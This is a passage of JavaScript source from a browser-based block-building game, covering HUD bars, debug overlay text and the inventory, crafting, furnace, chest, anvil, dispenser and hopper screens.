			let heartNum = floor(outline ? p.lastDamageHealth : p.health)
			let actualHeartNum = floor(p.health)
      let wither = !!p.effects.wither
      let i
			for(i=0; i<20; i+=2){
        var heartX = (i * dw) + x;
        var offY = p.health < 5 ? (round(Math.random())*2)-1 : 0
				drawTexture(outline?"heartBlink":"heartBackground", heartX, iy+offY, iw, iw)
				/*if(i>=actualHeartNum) ctx.filter = "invert(1) brightness(0.5) invert(1)"
        if(heartNum !== i+1){
          drawTexture(wither ? (survival === "hardcore" ? "onceWitherHeart" : "witherHeart") : (freezeEffect === 140 ? (survival === "hardcore" ? "onceFreezeHeart" : "freezeHeart") : (survival === "hardcore" ? "onceHeart" : "heart")), heartX, iy+offY, iw, iw);
        }
				if(actualHeartNum === i+1) ctx.filter = "none"*/
				if(i+1>=actualHeartNum && i<heartNum){
					ctx.filter = "invert(1) brightness(0.5) invert(1)"
					if(heartNum === i+1){
						drawTexture(wither ? (p.gameMode === "hardcore" ? "onceWitherHalfHeart" : "witherHalfHeart"): (freezeEffect === 140 ? (p.gameMode === "hardcore" ? "onceFreezeHalfHeart" : "freezeHalfHeart") : (p.gameMode === "hardcore" ? "onceHalfHeart" : "halfHeart")), heartX, iy+offY, iw, iw);
					}else{
						drawTexture(wither ? (p.gameMode === "hardcore" ? "onceWitherHeart" : "witherHeart") : (freezeEffect === 140 ? (p.gameMode === "hardcore" ? "onceFreezeHeart" : "freezeHeart") : (p.gameMode === "hardcore" ? "onceHeart" : "heart")), heartX, iy+offY, iw, iw);
					}
					ctx.filter = "none"
				}
				if(i+1 === actualHeartNum){
          drawTexture(wither ? (p.gameMode === "hardcore" ? "onceWitherHalfHeart" : "witherHalfHeart"): (freezeEffect === 140 ? (p.gameMode === "hardcore" ? "onceFreezeHalfHeart" : "freezeHalfHeart") : (p.gameMode === "hardcore" ? "onceHalfHeart" : "halfHeart")), heartX, iy+offY, iw, iw);
        }else if(i<actualHeartNum){
					drawTexture(wither ? (p.gameMode === "hardcore" ? "onceWitherHeart" : "witherHeart") : (freezeEffect === 140 ? (p.gameMode === "hardcore" ? "onceFreezeHeart" : "freezeHeart") : (p.gameMode === "hardcore" ? "onceHeart" : "heart")), heartX, iy+offY, iw, iw);
				}
      }
      //Hunger bar
      for(i=0; i<p.food; i+=2){
        let offY = (p.foodJitter === 0 || p.food < 2) ? round(Math.random()*2-1)*pw : 0
        let X = maxX - (i * dw) - aw
				drawTexture("foodBackground", X, iy+offY, iw, iw)
				drawTexture(p.food === i+1 ? "foodHalf" : "foodFull", X, iy+offY, iw, iw)
      }
      for(; i<20; i+=2){
        var offY = (p.foodJitter === 0 || p.food < 2) ? round(Math.random()*2-1)*pw : 0
        var X = maxX - (i * dw) - aw
        drawTexture("foodBackground", X, iy+offY, iw, iw);
      }
      //Oxygen bar
      if(p.oxygen !== 20){
        for(i=0; i<p.oxygen; i+=2){
          var bubbleX = (maxX - (iw*10)) + (i * dw) + aw
          if(p.oxygen === i+1){
            drawTexture("xbubblePop", bubbleX, iy-ih, iw, iw);
          }else{
            drawTexture("xbubble", bubbleX, iy-ih, iw, iw);
          }
        }
      }
      
      //Temperature
      let temp = Math.round(p.temperature)
      /*if(temp !== 10){
        for(i=0; i<temp; i+=2){
          if(i+2 <= temp){
            var X = maxX - (i*iw2) - iw
            drawImage("hot", X, iy - ih*2, iw, iw);
          }
        }
        var I = i
        for(i=18; i>=temp; i-=2){
          var X = maxX - (i*iw2) - iw
          drawImage("cold", X, iy - ih*2, iw, iw);
        }
        if(I !== temp){
          var X = maxX - (i*iw2) - iw
          drawImage("warm", X, iy - ih*2, iw, iw);
        }
      }*/
			ctx.fillStyle = inventory.tempGrad
			ctx.fillRect(maxX-iw*10.5,iy-ih*2,iw*10,iw)
			if(temp>=20){
				ctx.fillStyle = "red"
				ctx.fillRect(maxX-iw*0.5,iy-ih*2,iw*0.5*(temp-19),iw)
			}
			if(temp<0){
				ctx.fillStyle = "blue"
				ctx.fillRect(maxX-iw*10.5,iy-ih*2,iw*0.5*(temp+1),iw)
			}
			drawImage("cold", maxX-iw*11, iy - ih*2, iw, iw)
			drawImage("hot", maxX-iw, iy - ih*2, iw, iw)
			ctx.fillStyle = "black"
			let tempOffsetX = 0, tempOffsetY = 0
			if(temp>19){
				tempOffsetX = (Math.random()*((p.temperature-19)/4)-0.5)*iw
				tempOffsetY = (Math.random()*((p.temperature-19)/4)*0.25-0.125)*iw
			}
			ctx.fillRect(maxX-iw*(20-temp)*0.5+tempOffsetX, iy-ih*2-iw*0.125+tempOffsetY, iw*0.0625,iw*1.25)
      
      let xpBar = p.XP / p.nextLevel
      let level = p.level
      drawImage("experienceBar", 0,0,182,5, x,iy+ih,s*9,xpbh)
      drawImage("experienceBar", 0,5,182*xpBar,5, x,iy+ih,s*9*xpBar,xpbh)
      if(level){
        ctx.font = iw+"px thefont"
        ctx.textAlign = "center"
        let barX = x+s*4.5
        ctx.strokeStyle = "black"
        ctx.lineWidth = 4
        ctx.strokeText(level, barX, iy+ih)
        ctx.fillStyle = colors.css.a
        ctx.fillText(level, barX, iy+ih)
        ctx.textAlign = "left"
      }
    }
    
    if(freezeEffect > 0){
      let opacity = freezeEffect / 140
      ctx.globalAlpha = opacity
      drawImage("freezeEffect",0,0,width,height)
      ctx.globalAlpha = 1
    }
    
    if(inventory.showName > 0){
      ctx.globalAlpha = inventory.showName > 1 ? 1 : inventory.showName
      ctx.font = "16px thefont"
      let slot = inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]
      let id = slot && slot.id
      if(slot && slot.id && slot.id < isCube && !blockData[slot.id].item) {
        id = slot.id | blockMode
      }
      let name = slot && slot.id && (slot.customName || "block."+id)
      if(name){
        fill(255)
        ctx.textAlign = "center"
        text(name, (width/2),y-46, 16,2)
        ctx.textAlign = "left"
      }
      ctx.globalAlpha = 1
    }
		}
    
    ctx.fillStyle = "white"
    ctx.font = 16*ss+"px thefont"

		debugLines.length = 0
		if(showDebug === -1) debugLines.push("Press F3 to show debug")

		if (p.autoBreak) {
			debugLines.push("Super breaker enabled")
		}
    if (p.autoBuild) {
			debugLines.push("Hyper builder enabled")
		}
		{
			let closest = Infinity
			let cname = "No one"
			let spectating = 0
			for (let name in players) {
				let pos = players[name]
				if(pos.dimension === p.dimension && !pos.hidden){
					let distance = sqrt((pos.x - p.x)*(pos.x - p.x) + (pos.y - p.y)*(pos.y - p.y) + (pos.z - p.z)*(pos.z - p.z))
					if (distance < closest) {
						closest = distance
						cname = pos.username
					}
				}
				if(pos.spectating === p.id) spectating++
			}
			if(cname === "No one") closest = 0
			let info = round(closest)+" meters away"
			if(closest === 0) info = "Right here"
			debugLines.push(`Closest player: ${cname} (${info})`)
			if(spectating){
				debugLines.push(`${spectating} spectators spectating you.`)
			}
		}
		{
			let closest = Infinity
			let cname = "No one"
			let closestHostile = Infinity
			//world.getEntitiesNear(p.x,p.y,p.z,p.dimension, settings.renderDistance*16, nearEntityArray)
      for (let [id,ent] of world.entities) {
        if(ent.mob && ent.dimension === p.dimension && !ent.hidden){
          let distance = sqrt((ent.x - p.x)*(ent.x - p.x) + (ent.y - p.y)*(ent.y - p.y) + (ent.z - p.z)*(ent.z - p.z))
          if (distance < closest) {
            closest = distance
            cname = ent.name || ent.defaultName
          }
					if(ent.target === p.id){
						closestHostile = min(closestHostile, distance)
					}
        }
			}
      if(cname === "No one") closest = 0
      let info = round(closest)+" meters away"
      if(closest === 0) info = "Right here"
			debugLines.push(`Closest mob: ${cname} (${info})`)
			if(closestHostile < 16){
				if(tick) hostileMobNearbyTimer += (16-closestHostile)/16
				debugLines.push("Hostile mob nearby"+((hostileMobNearbyTimer%4)<2 ? " " : ""))
				updateHUD = true
			}
		}

		if(showDebug === 1){
			debugLines.push(
				"Average Frame Time: " + analytics.displayedFrameTime + "ms",
				"Worst Frame Time: " + analytics.displayedwFrameTime + "ms",
				"Render Time: " + analytics.displayedRenderTime + "ms",
				"Tick Time: " + analytics.displayedTickTime + "ms",
				"Rendered Chunks: " + renderedChunks.toLocaleString() + " / " + world.loaded.length.toLocaleString(),
				"Rendered Entities: " + renderedEntities.toLocaleString() + " / " + totalEntites.toLocaleString(),
				"Generated Chunks: " + (host ? serverWorld.generatedChunks : "unknown")
			)
		}else if(showDebug === 2){
			debugLines.push(
				"Dimension: "+p.dimension,
				"Biome: "+world.getBiome(p2.x,p2.y,p2.z,p.dimension),
				"Sky light: "+world.getLight(p2.x,p2.y,p2.z,0,p.dimension),
				"Block light: "+world.getLight(p2.x,p2.y,p2.z,1,p.dimension),
				"Sky light source: "+world.getLight(p2.x,p2.y,p2.z,2,p.dimension)
			)
		}
		debugLines.push("TPS: " + analytics.tps, "FPS: " + analytics.fps)
		ctx.textAlign = 'left'
		text(debugLines.join("\n"), 5, height - 5, 16*ss, 3)
		ctx.textAlign = 'right'
		text("Position: " + p2.x + ", " + p2.y + ", " + p2.z, width - 10, 5, 16*ss, 4)

		ctx.drawImage(gl.canvas, 0, 0, width,height)
	}
  
	function slotInv(){
		let s = inventory.size
		let s2 = s / 2
		let slots = inventory.slotPos
		slots.length = 0
		let idx = 0
		if(inventory.category === 0){
			for(let y=0; y<3; y++) for(let x=0; x<9; x++){
				slots.push(50.5-s2+x*s, 50.5-s2+y*s, inventory.slotIds.main[idx++])
			}
		}
		let x = width / 2 - 9 / 2 * s + 0.5 + 25
		let y = height - s * 1.5 + 0.5
		for(let i=0; i<9; i++){
			slots.push(x+i*s,y, inventory.slotIds.hotbar[i])
		}
		if(screen === "inventory" || screen === "crafting"){
			let offX = width - s*4
			let offY = s * 2
			let craftResX = offX+(s/2)
			let craftResY = offY+(s*3)
			let w = 2
			if(screen === "crafting"){
				craftResX = offX+s
				craftResY = offY+s*4
				w = 3
			}
			idx = 0
			for(let y=0; y<w; y++) for(let x=0; x<w; x++){
				slots.push(offX+x*s, offY+y*s, (screen === "crafting" ? inventory.slotIds.crafting3 : inventory.slotIds.crafting2)[idx++])
			}
			slots.push(craftResX,craftResY, inventory.slotIds.craftingResult)
		}else if(screen === "furnace"){
			let offX = width - s*4
			let offY = s * 2
			x = offX
			y = offY
			slots.push(x,y,inventory.slotIds.furnaceInput)
			//fuel
			x = offX
			y = offY + (s*2)
			slots.push(x,y,inventory.slotIds.furnaceFuel)
			
			//output
			x = offX + (s*2)
			y = offY + s
			slots.push(x,y,inventory.slotIds.furnaceOutput)
		}else if(screen === "chest"){
			let x = 50.5 - s2
			let y = 50.5 + 8.7*s
			idx = 0
			for(let i=0; i<27; i++){
        let ix = i%9
        let iy = floor(i/9)
        ix = x + ix*s
        iy = y + iy*s
        slots.push(ix,iy,inventory.slotIds.chest[idx++])
      }
		}else if(screen === "anvil"){
			let offX = width - s*5
			let offY = s * 2
			//input
			let x = offX
			let y = offY
			slots.push(x,y,inventory.slotIds.anvilInput)
			x += s
			x += s2
			slots.push(x,y,inventory.slotIds.anvilMaterial)
			x += s
			x += s
			slots.push(x,y,inventory.slotIds.anvilOutput)
		}else if(screen === "dispenser"){
			let offX = width - s*4
			let offY = s * 2
			for(let y=0; y<3; y++){
				for(let x=0; x<3; x++){
					let idx = (y*3) + x
					slots.push(x*s+offX, y*s+offY, inventory.slotIds.dispenser[idx])
				}
			}
		}else if(screen === "hopper"){
			let x = 50.5 - s2
    	let y = 11*s
			for(let i=0; i<5; i++) slots.push(x+i*s, y, inventory.slotIds.hopper[i])
		}
	}

  let invHeight = 0
	function startDrawInv(){
		defineWorld()
		ctx.drawImage(gl.canvas,0,0, width,height)//image of inventory overwrites webgl canvas
		if(changeSceneAnimation !== null){
			if(!thisSceneCurrent) clear()
		}
		gl.clearColor(0, 0, 0, 0)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
    gl.useProgram(program3D)
    gl.uniform1i(glCache.uSampler, 0)
		ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
		ctx.textAlign = 'left'
		ctx.fillStyle = "rgb(127, 127, 127, 65%)"
		ctx.fillRect(0, 0, width, height)
    ctx2.clearRect(0, 0, width, height)
		FOV(90)
	}
	function drawInv(nodraw) {
		let x = 0
		let y = 0
		let s = inventory.size
		let s2 = s / 2
		let perRow = inventory.category === 0 ? 9 : Math.floor(width/s)-8
		let rows = inventory.category === 0 ? 3 : 8
    if(screen === "inventory") startDrawInv()

    let count = 1;
    if(inventory.category === 0){
      count = 27
    }else{
      if(!inventoryBlocks[inventory.category]){
        logError("No category called "+inventory.category)
        inventory.category = "search"
      }
      count = inventoryBlocks[inventory.category].length
    }
    invHeight = (Math.ceil(count / perRow) * s)
    let invWinH = s * rows;

    // Scrollbar
    if(p.survival || inventory.category === 0){
      inventoryScrollable.setScrollSize(0)
      inventory.category = 0
    }else{
			inventoryScrollable.setPos(50.5 - s2, 50.5 - s2, perRow*s+24, invWinH)
			inventoryScrollable.setScrollSize(invHeight)
    }
		let invScroll = inventoryScrollable.el.scrollTop

		// Draw the grid
		ctx.lineWidth = 1
		ctx.strokeStyle = "black"
		ctx.beginPath()
		for (y = 0; y < rows+1; y++) {
			ctx.moveTo(50.5 - s2, 50.5 - s2 + y * s - (invScroll % s))
			ctx.lineTo(50.5 - s2 + s * perRow, 50.5 - s2 + y * s - (invScroll % s))
		}
		y--
		for (x = 0; x < perRow + 1; x++) {
			ctx.moveTo(50.5 - s2 + s * x, 50.5 - s2 - (invScroll % s))
			ctx.lineTo(50.5 - s2 + s * x, 50.5 - s2 + y * s - (invScroll % s))
		}

		// Hotbar
		x = width / 2 - 9 / 2 * s + 0.5 + 25
		y = height - s * 1.5 + 0.5
		ctx.moveTo(x, y)
		ctx.lineTo(x + s * 9, y)
		ctx.moveTo(x, y + s)
		ctx.lineTo(x + s * 9, y + s)
		for(let i = 0; i <= 9; i ++) {
			ctx.moveTo(x + i * s, y)
			ctx.lineTo(x + i * s, y + s)
		}
		ctx.stroke()
    
		//Box highlight in inv
		let overInv = Math.round(((mouseY + invScroll) - 50) / s) * perRow + Math.round((mouseX - 50) / s)
		if (inventory.category !== 0 && overInv >= 0 && overInv < count && mouseX < 50 - s2 + perRow * s && mouseX > 50 - s2) {
			x = overInv % perRow * s + 50 - s2
			y = (overInv / perRow | 0) * s + 50 - s2
      y -= invScroll
      if(mouseY < s*rows+50.5-s2){
        ctx.lineWidth = 2
        ctx.strokeStyle = "white"
        ctx.beginPath()
        ctx.strokeRect(x, y, s, s)
      }
		}
    
		if (inventory.slots[inventory.slotIds.holding]) {
			let item = inventory.slots[inventory.slotIds.holding]
			if(!blockData[item.id])throw new Error("no block "+item.id+" from inventory.holding")
			drawIcon(mouseX, mouseY, item.id, item, !p.survival)
		}
		if(inventory.category !== 0){
      for (let i = max(Math.floor(invScroll / s)*perRow, 0); i < (Math.floor(invScroll / s)+rows)*perRow && i < inventoryBlocks[inventory.category].length; i++) {
        x = i % perRow * s + 50
        y = (i / perRow | 0) * s + 50
        y -= invScroll
				if(!blockData[inventoryBlocks[inventory.category][i]])throw new Error("no block "+inventoryBlocks[inventory.category][i]+" from inventoryBlocks, category:"+inventory.category+" i:"+i)
        drawIcon(x, y, inventoryBlocks[inventory.category][i])
      }
    }
    
    if(screen === "inventory"){
      let offX = width - s*4
      let offY = s*2
      //draw grid
      ctx.lineWidth = 1
      ctx.strokeStyle = "black"
      ctx.beginPath()
      let y = s*2+offY
      let x
      for(x=0; x<3; x++){
        ctx.moveTo(x*s+offX, offY)
        ctx.lineTo(x*s+offX, y)
      }
      x = s*2+offX
      for(y=0; y<3; y++){
        ctx.moveTo(offX, y*s+offY)
        ctx.lineTo(x, y*s+offY)
      }
      ctx.stroke()

      x = offX + (s/2)
      y = offY + (s*3)
      ctx.lineWidth = 1
      ctx.strokeStyle = "black"
      ctx.strokeRect(x,y, s,s)

      x = 50.5-s2
      y = 50.5-s2+s*rows+s*1.5
			ctx.lineWidth = 1
			ctx.strokeStyle = "black"
			ctx.beginPath()
			ctx.moveTo(x, y)
			ctx.lineTo(x+armorSlots.length*s, y)
			ctx.moveTo(x, y+s)
			ctx.lineTo(x+armorSlots.length*s, y+s)
			for(let i=0; i<armorSlots.length+1; i++){
        ctx.moveTo(x+i*s, y)
        ctx.lineTo(x+i*s, y+s)
				if(i<armorSlots.length) drawImage(armorSlots[i],x+i*s,y,s,s)
			}
			ctx.stroke()
			let over = floor((mouseX - x)/s)
			if(mouseX > x && mouseX < x+s*armorSlots.length && mouseY > y && mouseY < y+s){
				ctx.lineWidth = 2
        ctx.strokeStyle = "white"
        ctx.beginPath()
        ctx.strokeRect(x+over*s, y, s, s)
			}
    }
    
		let showName
		if (inventory.category !== 0 && overInv >= 0 && overInv < count && mouseX < 50 - s2 + perRow * s && mouseX > 50 - s2 && mouseY<s*rows+50.5-s2) {
			x = overInv % perRow
			y = (overInv / perRow | 0)
      
      let idx=x+(y*perRow)
      idx = inventoryBlocks[inventory.category][idx]
      let name;
			name = blockData[idx] ? "block."+idx : ""
			if(name) showName = name
		}

		let slots = inventory.slotPos
		for(let i=0; i<slots.length; i+=3){
			let item = inventory.slots[slots[i+2]]
			let x = slots[i], y = slots[i+1]
			let noAmount = !p.survival
			if(inventory.spreaded.length && inventory.spreaded.includes(slots[i+2])){
				ctx.fillStyle = "rgb(180,180,180)"
				ctx.fillRect(x,y,s,s)
				noAmount = true
			}
			if(item){
				if(!blockData[item.id])throw new Error("no block "+item.id+" from spread")
				drawIcon(x+s2, y+s2, item.id, item, noAmount)
			}
			if(mouseX>x && mouseX<x+s && mouseY>y && mouseY<y+s){
				ctx.lineWidth = 2
				ctx.strokeStyle = "white"
				ctx.beginPath()
				ctx.strokeRect(x, y, s, s)
				let name = item && item.id && (item.customName || "block."+item.id) || ""
				if(name !== "") showName = name
			}
		}
		ctx.drawImage(gl.canvas,0,0, width,height)
    if(showName){
			showHoverbox(showName)
		}
    ctx.drawImage(canvas2, 0,0), ctx.globalAlpha = 1
	}
	function clickInv(dontRedraw,mouse) {
		let s = inventory.size
		let s2 = s / 2
		let perRow = Math.floor(width/s)-8
		let rows = 8
		let invScroll = inventoryScrollable.el.scrollTop
		let over = Math.round((mouseY + invScroll - 50) / s) * perRow + Math.round((mouseX - 50) / s)
    
    let count = inventory.category === 0 ? 27 : inventoryBlocks[inventory.category].length
    
		let armorX = 50.5-s2
    let armorY = 50.5-s2+s*rows+s*1.5
		let armorOver = floor((mouseX - armorX)/s)
    
		findSlot:{
			if(inventory.category !== 0 && over >= 0 && over < count && mouseX < 50 - s2 + perRow * s && mouseX > 50 - s2 && mouseY < s*rows+50.5-s2){
				inventory.slots[inventory.slotIds.holding] = {id:inventoryBlocks[inventory.category][over], amount:blockData[inventoryBlocks[inventory.category][over]].stackSize}
				send({type:"containerChange",data:[inventory.slots[inventory.slotIds.holding]],idxs:[inventory.slotIds.holding]})
				break findSlot
			}
			let slots = inventory.slotPos
			for(let i=0; i<slots.length; i+=3){
				let item = inventory.slots[slots[i+2]]
				let x = slots[i], y = slots[i+1]
				if(mouseX>x && mouseX<x+s && mouseY>y && mouseY<y+s){
					let holding = inventory.slots[inventory.slotIds.holding]
					if(mouse === 2 && holding && holding.amount > 1){
						let canSplit = item && holding.id === item.id && (!holding.customName && !item.customName || holding.customName === item.customName) && item.amount < blockData[item.id].stackSize
						if(!item){
							canSplit = true
							item = {id:holding.id,amount:0,customName:holding.customName}
						}
						if(canSplit){
							item.amount ++
							holding.amount --
							if(holding.amount <= 0) holding = null
						}
					}else if(item){
						if(holding && holding.id === item.id && (!holding.customName && !item.customName || holding.customName === item.customName) && holding.amount < blockData[holding.id].stackSize && item.amount < blockData[item.id].stackSize){ //stacking together
							let stackSize = blockData[item.id].stackSize
							while(holding.amount > 0 && item.amount < stackSize){
								holding.amount--
								item.amount ++
							}
							if(holding.amount <= 0){
								holding = null
							}
						}else{
							let temp = holding
							holding = item
							if(temp){
								item = temp
							}else item = null
						}
					}else if(holding){
						item = holding
						holding = null
						inventory.spreadStart = slots[i+2]
						//inventory.spreadPlace = "invSpace"
						inventory.spreadItem = item
					}
					inventory.slots[inventory.slotIds.holding] = holding
					inventory.slots[slots[i+2]] = item
					send({type:"containerChange",data:[holding,item],idxs:[inventory.slotIds.holding,slots[i+2]]})
					break findSlot
				}
			}
			inventory.slots[inventory.slotIds.holding] = null
			send({type:"containerChange",data:[null],idxs:[inventory.slotIds.holding]})
		}

		if(!dontRedraw)drawScreens.inventory()
	}
  function invCategory(c){
    inventory.category = c
    if(c === "search"){
      invTextbox.classList.remove("hidden")
    }else{
      invTextbox.classList.add("hidden")
    }
		slotInv()
    drawScreens[screen]()
  }
  function moveInv(){
    let s = inventory.size
		let s2 = s / 2
		if(inventory.spreadStart === -1) return
		let slots = inventory.slotPos
		for(let i=0; i<slots.length; i+=3){
			let item = inventory.slots[slots[i+2]]
			let x = slots[i], y = slots[i+1]
			let slotId = slots[i+2]
			if(mouseX>x && mouseX<x+s && mouseY>y && mouseY<y+s){
        if(!item && slotId !== inventory.spreadStart && inventory.spreaded.length < inventory.spreadItem.amount){
          if(inventory.spreaded.length){
            inventory.slots[slotId] = inventory.spreadItem
            inventory.spreaded.push(slotId)
          }else{
            inventory.slots[slotId] = inventory.spreadItem
            inventory.spreaded.push(inventory.spreadStart, slotId)
          }
        }
				break
			}
		}
  }
  function releaseInv(){
    let s = inventory.size
		let s2 = s / 2
		
		if(inventory.spreaded.length){
			//a/b with remainder
			let a=inventory.spreadItem.amount
			let b=inventory.spreaded.length
			let n=floor(a/b)
			let r=a%b
			//n = result   r = remainder
			
			let id = inventory.spreadItem.id
			
			let data = [], idxs = []
			for(var i=0; i<inventory.spreaded.length; i++){
				inventory.slots[inventory.spreaded[i]] = {id:id, amount:n, customName:inventory.spreadItem.customName}
				data.push(inventory.slots[inventory.spreaded[i]])
				idxs.push(inventory.spreaded[i])
			}
			if(r){
				inventory.slots[inventory.slotIds.holding] = {id:id, amount:r}
				data.push(inventory.slots[inventory.slotIds.holding])
				idxs.push(inventory.slotIds.holding)
			}
			inventory.spreaded = []
			send({type:"containerChange",data,idxs})
		}
		inventory.spreadStart = -1
		inventory.spreadItem = null
  }

  function drawCrafting() {
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    
    let offX = width - s*4
    let offY = s * 2
    //draw grid
    ctx.lineWidth = 1
		ctx.strokeStyle = "black"
		ctx.beginPath()
    let y = s*3+offY
    let x
    for(x=0; x<4; x++){
      ctx.moveTo(x*s+offX, offY)
      ctx.lineTo(x*s+offX, y)
    }
    x = s*3+offX
    for(y=0; y<4; y++){
      ctx.moveTo(offX, y*s+offY)
      ctx.lineTo(x, y*s+offY)
    }
    ctx.stroke()
    
    
    x = offX + (s)
    y = offY + (s*4)
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
		drawInv(true)
  }
  
  function clickCrafting(mouse) {
		clickInv(true, mouse)
    let s = inventory.size
    let s2 = s/2
    let offX = width - s*4
    let offY = s * 2
    
    drawScreens.crafting()
  }
  
  function drawFurnace(){
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    
    let offX = width - s*4
    let offY = s * 2
    
    ctx.font = "24px thefont"
    ctx.fillStyle = "white"
    ctx.textAlign = "left"
    ctx.fillText("Furnace", offX, offY - s2)
    
    let x = offX+s2-s/8
    let y = offY+s
    fill(100)
    ctx.fillRect(x,y,s/4,s)
    if(containerData.burnProgress){
      fill(255,containerData.burnProgress*255,0)
      let h = containerData.burnProgress*s
      ctx.fillRect(x,y+s-h,s/4,h)
    }
    
    x = offX+s
    y = offY+s
    ctx.strokeStyle = "black"
    ctx.lineWidth = 1
    ctx.beginPath()
    ctx.moveTo(x+s,y+s2)
    ctx.lineTo(x+s2,y)
    ctx.moveTo(x+s,y+s2)
    ctx.lineTo(x+s2,y+s)
    ctx.stroke()
    y = y+s2-2
    fill(0)
    ctx.fillRect(x,y,s,4)
    if(containerData.progress){
      fill(255)
      ctx.fillRect(x,y,s*containerData.progress,4)
    }
    
    //input
    x = offX
    y = offY
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
    //fuel
    x = offX
    y = offY + (s*2)
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
    //output
    x = offX + (s*2)
    y = offY + s
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
		drawInv(true)
  }
  function clickFurnace(mouse){
		clickInv(true, mouse)
    drawScreens.furnace()
  }
  
  function drawChest(){
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    var w = 9
    var h = 3
    var length = 27
    
    var block = world.getBlock(containerData.x, containerData.y, containerData.z,containerData.dimension)
    var containerType = blockData[block].Name
    
    var x = 50.5 - s2
    var y = 50.5 + 8.7*s
    ctx.lineWidth = 1
		ctx.strokeStyle = "black"
    ctx.beginPath()
    for(var lx = 0; lx < w + 1; lx++){
      ctx.moveTo(x + lx*s, y)
      ctx.lineTo(x + lx*s, y+h*s)
    }
    for(var ly = 0; ly < h + 1; ly++){
      ctx.moveTo(x, y+ly*s)
      ctx.lineTo(x + w*s, y+ly*s)
    }
    ctx.stroke()
    
    ctx.fillStyle = "white"
    ctx.font = "16px thefont"
    ctx.textAlign = "left"
    ctx.fillText(containerType, x, y-4)
    
		drawInv(true)
  }
  function clickChest(mouse){
		clickInv(true, mouse)
    
    drawChest()
  }

  function drawAnvil(){
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    let s4 = s/4
    
    let offX = width - s*5
    let offY = s * 2
    
    //input
    let x = offX
    let y = offY
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
    //+
    x += s
    ctx.beginPath()
    ctx.moveTo(x,y+s2)
    ctx.lineTo(x+s2,y+s2)
    ctx.moveTo(x+s4,y+s4)
    ctx.lineTo(x+s4,y+s2+s4)
    ctx.stroke()
    
    x += s2
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
    //arrow
    x += s
    ctx.strokeStyle = "black"
    ctx.lineWidth = 1
    ctx.beginPath()
    ctx.moveTo(x+s,y+s2)
    ctx.lineTo(x+s2,y)
    ctx.moveTo(x+s,y+s2)
    ctx.lineTo(x+s2,y+s)
    ctx.moveTo(x,y+s2)
    ctx.lineTo(x+s,y+s2)
    ctx.stroke()
    
    x += s
    ctx.lineWidth = 1
    ctx.strokeStyle = "black"
    ctx.strokeRect(x,y, s,s)
    
    ctx.fillStyle = "white"
    ctx.font = "16px thefont"
    ctx.textAlign = "left"
    ctx.fillText("Anvil", offX, offY-s)
    
    if(containerData.anvilCost){
      x = offX
      y = offY+s+20
      ctx.fillText("Cost: "+containerData.anvilCost+" levels",x,y)
    }

		drawInv(true)
  }
	anvilTextbox.onchange = function(){
		send({type:"containerChangeAnvil",rename:this.value,cost:0})
	}
  function clickAnvil(mouse){
    clickInv(true, mouse)
    drawAnvil()
  }

  function drawDispenser() {
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    
    let offX = width - s*4
    let offY = s * 2
    //draw grid
    ctx.lineWidth = 1
		ctx.strokeStyle = "black"
		ctx.beginPath()
    let y = s*3+offY
    let x
    for(x=0; x<4; x++){
      ctx.moveTo(x*s+offX, offY)
      ctx.lineTo(x*s+offX, y)
    }
    x = s*3+offX
    for(y=0; y<4; y++){
      ctx.moveTo(offX, y*s+offY)
      ctx.lineTo(x, y*s+offY)
    }
    ctx.stroke()
    
		drawInv(true)
  }
  
  function clickDispenser(mouse) {
    let s = inventory.size
    let s2 = s/2
    let offX = width - s*4
    let offY = s * 2
		clickInv(true, mouse)
    
    drawDispenser()
  }
  
  function drawHopper(){
    startDrawInv()
    let s = inventory.size
    let s2 = s/2
    var length = 5
    
    var x = 50.5 - s2
    var y = 11*s
    ctx.lineWidth = 1
		ctx.strokeStyle = "black"
    ctx.beginPath()
    for(var lx = 0; lx < length + 1; lx++){
      ctx.moveTo(x + lx*s, y)
      ctx.lineTo(x + lx*s, y+s)
    }
    ctx.moveTo(x, y)
    ctx.lineTo(x + length*s, y)
    ctx.moveTo(x, y+s)
    ctx.lineTo(x + length*s, y+s)
    ctx.stroke()
    
    ctx.fillStyle = "white"
    ctx.font = "16px thefont"
    ctx.textAlign = "left"
    ctx.fillText("Item Hopper", x, y-4)
    
		drawInv(true)
  }
  function clickHopper(mouse){
		clickInv(true, mouse)
    
    drawHopper()
  }

	/*let pvCanvas = new OffscreenCanvas(0,0)
	let pvCtx = pvCanvas.getContext('2d')
	let pvPackets = []
	let pvLastUpdateSize = 0, pvSize = 0, pvTotalSize = ""
	function drawPacketViewerRaw(){
		if(tick){
			let h = height - 100
			if(pvCanvas.width !== width) pvCanvas.width = width
			if(pvCanvas.height !== h) pvCanvas.height = h
			pvCtx.fillStyle = "rgb(0,0,0,10%)"
			pvCtx.fillRect(0,0,width,h)
			pvCtx.font = "16px monospace"
			pvCtx.textBaseline = "top"
			for(let i=0;i<pvPackets.length;i+=4){
				if(pvPackets[i+3]) pvCtx.fillStyle = "lightblue"
				else pvCtx.fillStyle = "lime"
				let value = (pvPackets[i][floor(pvPackets[i+1]/8)]>>(7-(pvPackets[i+1]%8)))&1
				pvCtx.fillText(value,pvPackets[i+2]*16, (pvPackets[i+1]*16)%(h-16))
				pvPackets[i+1]++
				if(pvPackets[i+1] === pvPackets[i].length*8){
					pvPackets.splice(i,4)
					i-=4
				}
			}
		}
		ctx.drawImage(pvCanvas,0,100)
	}
	let pvRows = []
	function packetViewerAdd(arr, fromClient = false){ //Expects Uint8Array
		//find emptiest row
		pvRows.length = floor(width/16)
		pvRows.fill(0)
